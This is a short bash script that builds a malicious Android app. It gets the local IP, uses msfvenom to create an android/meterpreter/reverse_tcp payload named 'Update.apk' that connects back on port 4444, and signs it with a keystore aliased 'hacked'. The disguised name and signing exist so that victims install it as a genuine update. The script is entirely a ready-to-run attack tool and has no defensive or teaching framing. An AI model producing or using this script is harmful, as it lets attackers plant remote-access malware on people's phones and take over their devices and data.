#!/bin/bash

# check required packages
REQUIRED_PKG="zipalign"
PKG_OK=$(dpkg-query -W --showformat='${Status}\n' $REQUIRED_PKG|grep "install ok installed")
echo Checking for $REQUIRED_PKG: $PKG_OK
if [ "" = "$PKG_OK" ]; then
  echo "No $REQUIRED_PKG. Setting up $REQUIRED_PKG."
  sudo apt-get --yes install $REQUIRED_PKG 
fi

# set IP msf will listen on
myIp="$(hostname -I | cut -f1 -d' ')"
echo "LHOST IP set to: "  $myIp
echo "LPORT set to: 4444" 

# create payload
msfvenom -p android/meterpreter/reverse_tcp LHOST="${myIp}"  LPORT=4444 R > Update.apk

# make keystore and sign the apk file
keytool -genkey -V -keystore key.keystore -alias hacked -keyalg RSA -keysize 2048 -validity 10000
jarsigner -verbose -sigalg SHA1withRSA -digestalg SHA1 -keystore key.keystore Update.apk hacked

payloadSize="$(du -sh Update.apk)"
echo "Payload size: " $payloadSize
